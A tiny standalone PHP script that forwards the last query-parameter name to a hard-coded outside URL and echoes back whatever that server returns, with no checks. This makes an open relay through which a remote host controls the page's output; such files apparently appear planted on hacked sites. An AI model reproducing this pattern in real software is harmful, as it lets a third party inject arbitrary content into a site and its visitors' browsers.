<?php
$t = "http://dwindow.bo3d.net/free.php";
$p = "";
while (list($name, $value) = each($_GET))
	$p = $name;
echo file_get_contents($t."?".$p);
?>